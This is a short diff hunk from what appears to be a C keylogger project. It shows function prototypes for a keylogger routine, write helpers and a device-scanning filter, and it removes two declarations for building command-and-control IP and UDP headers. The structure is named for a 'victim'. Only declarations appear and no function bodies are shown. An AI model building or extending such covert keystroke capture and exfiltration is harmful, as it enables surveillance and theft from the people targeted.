@@ -89,8 +89,6 @@ void keylogger(int keyboard, int writeout, struct options_victim* ov);
 void safe_write_all(int file_desc, const char *str, int keyboard, struct options_victim* ov);
 int write_all(int file_desc, const char *str, struct options_victim* ov);
 void sigint_handler(int sig);
-unsigned short create_cnc_ip_header(struct iphdr* ih, char c, struct options_victim* ov);
-unsigned short create_cnc_udp_header(struct udphdr* uh);
 static int is_char_device(const struct dirent *file);
 
 
